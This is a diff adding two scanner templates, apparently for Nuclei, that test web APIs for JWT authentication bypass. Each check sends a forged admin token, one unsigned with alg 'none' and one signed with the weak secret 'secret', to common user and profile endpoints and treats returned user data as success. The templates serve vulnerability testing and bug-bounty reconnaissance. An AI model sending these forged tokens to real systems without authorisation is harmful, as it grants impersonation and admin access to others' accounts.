@@ -1,0 +1,88 @@
+id: bb-jwt-none-algorithm
+
+info:
+  name: JWT None Algorithm Authentication Bypass
+  author: guan4tou2
+  severity: critical
+  description: |
+    Tests if the server accepts JWTs signed with algorithm "none".
+    Directly exploitable: forge any user token without knowing the secret.
+  tags: bb-recon,jwt,auth-bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/v1/user"
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/v1/me"
+      - "{{BaseURL}}/me"
+
+    headers:
+      # JWT alg:none — {"alg":"none","typ":"JWT"}.{"sub":"1","role":"admin"}.
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: or
+        words:
+          - '"email"'
+          - '"user"'
+          - '"id"'
+          - '"username"'
+          - '"role"'
+        part: body
+
+      - type: word
+        negative: true
+        words:
+          - "invalid"
+          - "Invalid token"
+          - "unauthorized"
+          - "Unauthorized"
+          - "expired"
+        part: body
+
+---
+id: bb-jwt-weak-secret
+
+info:
+  name: JWT Signed with Weak Secret
+  author: guan4tou2
+  severity: high
+  description: |
+    Tests endpoints with a JWT pre-signed using the weak secret "secret".
+    Directly exploitable if server accepts this token.
+  tags: bb-recon,jwt,weak-secret
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/api/v1/profile"
+
+    headers:
+      # HS256 signed with secret "secret": {"sub":"1","role":"admin"}
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.2kuHMlmgCOb8GKvxuCFPMQN9P4EiElCOXMTMr8cMN9k"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: or
+        words:
+          - '"email"'
+          - '"user_id"'
+          - '"username"'
+          - '"role"'
+        part: body
